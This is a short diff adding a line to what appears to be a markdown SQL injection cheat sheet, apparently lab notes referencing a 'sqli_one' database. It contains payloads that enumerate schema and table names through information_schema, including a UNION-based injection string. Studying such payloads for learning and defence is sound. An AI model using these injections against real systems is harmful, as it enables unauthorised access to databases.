@@ -163,6 +163,7 @@ SELECT SUBSTRING((SELECT schema_name FROM information_schema.schemata LIMIT 1 OF
 **Find Table Names:**  
 ```sql 
 SELECT SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET 10),1,1);
+select substring(table_name,1,1) from information_schema.tables limit 1 offset 10;
 0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one' 
 ```
 **Find number of tables present in current db:**  
